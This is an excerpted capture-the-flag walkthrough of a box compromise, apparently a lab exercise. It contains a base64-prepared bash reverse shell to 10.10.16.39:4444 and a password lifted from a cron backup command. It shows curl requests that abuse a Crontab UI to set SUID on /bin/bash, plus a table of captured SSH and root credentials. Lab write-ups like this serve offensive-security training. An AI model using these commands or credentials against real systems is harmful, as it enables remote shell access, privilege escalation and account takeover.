...
```bash
echo 'bash -i >& /dev/tcp/10.10.16.39/4444 0>&1' | base64
...
```json
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana ... zip -P P4ssw0rdS0pRi0T3c ..."}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *"}
```

Two findings:
1. **Password** `P4ssw0rdS0pRi0T3c` embedded in the backup command
...
Basic-Auth credentials: user='root' pwd='P4ssw0rdS0pRi0T3c'
```
...
&& curl -s -u root:P4ssw0rdS0pRi0T3c -X POST "http://127.0.0.1:8000/save" \
  -d "_id=gNIRXh1WIc9K7BYX&name=Cleanup&command=chmod+u%2Bs+/bin/bash&schedule=*+*+*+*+*&logging=false" \
&& sleep 0.2 \
&& curl -s -u root:P4ssw0rdS0pRi0T3c -X POST "http://127.0.0.1:8000/runjob" \
...
```
ca432fa240de95d2b8acf59e600df051
```
...
| `enzo` | `RioTecRANDEntANT!` | SSH |
| `root` | `P4ssw0rdS0pRi0T3c` | Crontab UI |
